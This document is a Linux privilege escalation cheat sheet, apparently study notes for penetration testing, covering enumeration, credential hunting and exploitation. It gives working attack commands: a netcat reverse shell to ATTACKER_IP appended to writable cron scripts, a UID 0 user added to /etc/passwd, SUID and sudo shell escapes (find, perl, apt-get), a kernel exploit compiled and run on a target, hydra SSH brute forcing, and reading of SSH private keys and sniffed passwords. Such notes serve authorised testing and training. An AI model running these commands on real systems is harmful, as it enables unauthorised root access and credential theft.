# Linux Privilege Escalation Cheat Sheet

## Table of Contents
1. [File Permissions Overview](#file-permissions-overview)
2. [Manual Enumeration](#manual-enumeration)
3. [Automated Enumeration](#automated-enumeration)
4. [Exposed Confidential Information](#exposed-confidential-information)
5. [Insecure File Permissions](#insecure-file-permissions)
6. [Insecure System Components](#insecure-system-components)

---

## File Permissions Overview

### Linux Permission Scheme
- **r (read)**: View file content / List directory contents
- **w (write)**: Modify file / Create/delete files in directory
- **x (execute)**: Run file / Access directory (cd)

### Permission Format
```
-rwxr-xr--
│└┬┘└┬┘└┬┘
│ │  │  └── Others permissions
│ │  └───── Group permissions
│ └──────── Owner permissions
└────────── File type (- = file, d = directory)
```

### Special Permissions
- **SUID (s)**: Execute with file owner's permissions
- **SGID (s)**: Execute with group owner's permissions
- Symbolized by lowercase 's' or uppercase 'S'

---

## Manual Enumeration

### System Information

#### User Context
```bash
id                          # Current user UID, GID, groups
whoami                      # Current username
cat /etc/passwd             # All users 
grep -v /nologin /etc/passwd # Users with login shells
```
##### cat /etc/passwd
```bash
Encrypted Password: "x" - This field typically contains the hashed version of the user's password. In this case, the value x means that the entire password hash is contained in the /etc/shadow file
```

#### System Details
```bash
hostname                    # Machine hostname
cat /etc/issue              # OS information
cat /etc/os-release         # Detailed OS info
uname -a                    # Kernel version & architecture
arch                        # System architecture
```

#### Running Processes
```bash
ps aux                      # All running processes
ps aux | grep root          # Root-owned processes
ps u -C <process_name>      # Specific process
watch -n 1 "ps aux | grep pass"  # Monitor processes for passwords
```

### Network Information

#### Network Configuration
```bash
ip a                        # Network interfaces (modern)
ifconfig                    # Network interfaces (legacy)
ip route                    # Routing table
routel                      # Routing information
```

#### Network Connections
```bash
ss -anp                     # Active connections & listening ports
netstat -anp                # Legacy alternative
# Flags: -a (all), -n (numeric), -p (programs)
```

#### Firewall Rules
```bash
cat /etc/iptables/rules.v4  # Saved iptables rules
iptables -L                 # List rules (requires root)
```

### Scheduled Tasks

#### Cron Jobs
```bash
ls -lah /etc/cron*          # All cron directories
cat /etc/crontab            # System-wide cron jobs
crontab -l                  # Current user's cron jobs
sudo crontab -l             # Root's cron jobs (if permitted)
grep "CRON" /var/log/syslog # Cron execution logs
```

### Installed Applications
```bash
dpkg -l                     # Debian/Ubuntu packages
rpm -qa                     # RedHat/CentOS packages
```

### File System Enumeration

#### World-Writable Directories
```bash
find / -writable -type d 2>/dev/null
find / -perm -222 -type d 2>/dev/null
```

#### SUID Binaries
If a binary has the SUID bit set and the file is owned by root, any local user will be able to execute that binary with elevated privileges.
```bash
find / -perm -u=s -type f 2>/dev/null
find / -perm -4000 2>/dev/null
```

#### Mounted File Systems
```bash
cat /etc/fstab              # Boot-time mounts
mount                       # Currently mounted
lsblk                       # All block devices
```

#### Kernel Modules
```bash
lsmod                       # Loaded modules
/sbin/modinfo <module>      # Module information
```
#### More
A comprehensive list of Linux privilege escalation techniques can be found here:

- compendium by g0tmi1k [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation]
- PayloadsAllTheThings [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md]
- HackTricks - Linux Privilege Escalation [https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html]

---

## Automated Enumeration

### Tools

#### unix-privesc-check
Present on Kali - /usr/bin/unix-privesc-check
```bash
unix-privesc-check standard > output.txt
unix-privesc-check detailed > output.txt
```

#### Other Popular Tools
- **LinEnum**: Comprehensive enumeration script
- **LinPeas**: Advanced privilege escalation scanner
- Always complement with manual checks for custom configurations

---

## Exposed Confidential Information

### User History Files

#### Environment Variables
```bash
env                         # All environment variables
cat ~/.bashrc               # Bash configuration
cat ~/.bash_profile         # Bash profile
cat ~/.bash_history         # Command history
```

**Look for**: Passwords, API keys, credentials in variables

#### Common Dotfiles
```bash
ls -la ~/                   # List all dotfiles
cat ~/.ssh/id_rsa           # SSH private key
cat ~/.ssh/authorized_keys  # Authorized SSH keys
```

### Service Footprints

#### Process Monitoring
```bash
watch -n 1 "ps aux | grep pass"     # Monitor for passwords
ps aux | grep -i "user\|pass"       # Search process args
```

#### Network Traffic Capture
```bash
sudo tcpdump -i lo -A | grep "pass" # Capture loopback traffic
sudo tcpdump -i eth0 -A             # Capture network interface
```

**Note**: tcpdump requires root or specific sudo permissions

---

## Insecure File Permissions

### Abusing Cron Jobs

#### Exploitation Steps
1. Find writable cron scripts:
```bash
ls -la /etc/cron*
ls -la /var/spool/cron
```
We could also inspect the cron log file for running cron jobs -
```bash
grep "CRON" /var/log/syslog
```

2. Check script permissions:
```bash
ls -lah /path/to/script.sh
```

3. If writable, add reverse shell:
```bash
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP PORT >/tmp/f" >> script.sh
```

4. Setup listener:
```bash
nc -lnvp PORT
```

### Abusing /etc/passwd

#### Check Writability
```bash
ls -la /etc/passwd
```

#### Exploitation
1. Generate password hash:
```bash
openssl passwd <password>
```

2. Add root user:
```bash
echo "root2:HASH:0:0:root:/root:/bin/bash" >> /etc/passwd
```

3. Switch user:
```bash
su root2
```

**Note**: UID 0 = root privileges

---

## Insecure System Components

### SUID Binaries & Capabilities

#### Finding SUID Binaries
```bash
find / -perm -u=s -type f 2>/dev/null
find / -perm -4000 2>/dev/null
```

#### Finding Capabilities
```bash
/usr/sbin/getcap -r / 2>/dev/null
```

#### Exploitation Resources
- **GTFOBins**: https://gtfobins.github.io/
- Search for binary name to find exploitation techniques

#### Example: SUID find
```bash
find /home -exec /bin/bash -p \;
```

#### Example: Perl Capabilities
```bash
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
```

### Sudo Misconfigurations

#### Check Sudo Permissions
```bash
sudo -l                     # List allowed commands
```

#### Common Vulnerable Binaries
- **tcpdump**: Can execute scripts
- **apt-get**: Can spawn shell via changelog
- **vim/vi**: Can execute commands
- **find**: Can execute commands
- **nmap**: Interactive mode (older versions)

##### Note - 
Surprisingly, after executing the suggested command-set, if we are prompted with a "permission denied" error message.
To further investigate the culprit, we can inspect the syslog file -
```bash
cat /var/log/syslog | grep tcpdump   #or any other command/binary
```

#### Example: apt-get Exploitation
```bash
sudo apt-get changelog apt
# Then type: !/bin/sh
```

#### AppArmor Check
```bash
aa-status                   # Check AppArmor profiles
```

**Note**: AppArmor may prevent exploitation of certain binaries

### Kernel Exploits

#### Enumeration
```bash
uname -r                    # Kernel version
uname -a                    # Full system info
cat /etc/issue              # OS version
cat /etc/os-release         # Detailed OS info
arch                        # Architecture
```

#### Finding Exploits
```bash
searchsploit "linux kernel Ubuntu 16 Local Privilege Escalation"
searchsploit -m <exploit_id>  # Copy exploit locally
```
To make sure that the compilation process goes as smooth as possible, we take advantage of the fact that our target is already shipped with GCC. For this reason, we can compile and run the exploit on the target itself. Because of this we can take advantage of including the correct version of the libraries required by the target's architecture. This setup will lower the risks related to any cross-compilation compatibility issues. To begin with, we transfer the exploit source code over the target machine via the SCP tool.

#### Compilation
```bash
mv 45010.c cve-2017-16995.c

# Transfer to target
scp cve-2017-16995.c joe@192.168.123.216:

# On target (preferred):
gcc exploit.c -o exploit

# Check architecture:
file exploit

# Run:
./exploit
```

**Important**: Match kernel version, OS flavor, and architecture
Another thing we could quickly do is let's copy the exploit into our Kali home folder and then inspect the first 20 lines of it to spot any compilation instructions.
```bash
cp /usr/share/exploitdb/exploits/linux/local/45010.c .
head 45010.c -n 20
```

---

## Quick Reference Commands

### Password Cracking Wordlist
```bash
crunch 6 6 -t Lab%%% > wordlist
hydra -l user -P wordlist TARGET_IP -t 4 ssh -V
```

### Privilege Escalation Checks
```bash
# Quick SUID check
find / -perm -4000 -ls 2>/dev/null

# Quick capability check
getcap -r / 2>/dev/null

# Quick writable check
find / -writable -type f 2>/dev/null | grep -v proc

# Check sudo without password
sudo -n -l
```

### UID/GID Information
- **Real UID/GID**: User who launched the process
- **Effective UID/GID**: User checked for permissions
- **UID 0 = root**
- **GID 0 = root group**

---

## Key Files & Directories

| Location | Purpose |
|----------|---------|
| `/etc/passwd` | User account information |
| `/etc/shadow` | Password hashes (root only) |
| `/etc/sudoers` | Sudo permissions |
| `/etc/crontab` | System-wide cron jobs |
| `/var/spool/cron/crontabs/` | User cron jobs |
| `/etc/iptables/rules.v4` | Saved firewall rules |
| `/var/log/syslog` | System logs |
| `/proc/<PID>/status` | Process information |
| `~/.bashrc` | User bash configuration |
| `~/.bash_history` | Command history |

---

## Privilege Escalation Resources

### Online Resources
- **GTFOBins**: https://gtfobins.github.io/
- **MITRE ATT&CK**: Privilege Escalation techniques
- **HackTricks**: Linux privilege escalation guide
- **PayloadsAllTheThings**: Comprehensive exploit collection

### Tools
- unix-privesc-check
- LinEnum
- LinPeas
- searchsploit (ExploitDB)

---

## Best Practices

1. **Always enumerate manually first** - Automated tools miss custom configurations
2. **Match exploit to exact target** - Kernel exploits require precise matching
3. **Test in sandbox when possible** - Avoid system crashes
4. **Look for low-hanging fruit first**:
   - Writable /etc/passwd
   - World-writable cron scripts
   - Clear-text credentials in history
   - Misconfigured SUID binaries
5. **Document findings** - Track what you've tried
6. **Check for defense mechanisms** - AppArmor, SELinux, etc.

---

## Common Pitfall Warnings

- ⚠️ **Kernel exploits can crash systems** - Test carefully
- ⚠️ **AppArmor/SELinux may block exploits** - Check with `aa-status`
- ⚠️ **Architecture mismatch causes failures** - Verify with `file` command
- ⚠️ **Some binaries need full paths** - Use `/usr/sbin/getcap` not `getcap`
- ⚠️ **Clear-text passwords in env vars are common** - Always check `env`

---

## Quick Wins Checklist

- [ ] Get and run linpeas, unix-privesc-check and other auto enummeration
- [ ] Check `sudo -l` for misconfigurations
- [ ] Search for SUID binaries
- [ ] Check `/etc/passwd` writability
- [ ] Review environment variables for credentials
- [ ] Inspect cron jobs and their permissions
- [ ] Check capabilities with `getcap`
- [ ] Review bash history files
- [ ] Monitor active processes for passwords
- [ ] Look for writable scripts in PATH
- [ ] Check for kernel vulnerabilities
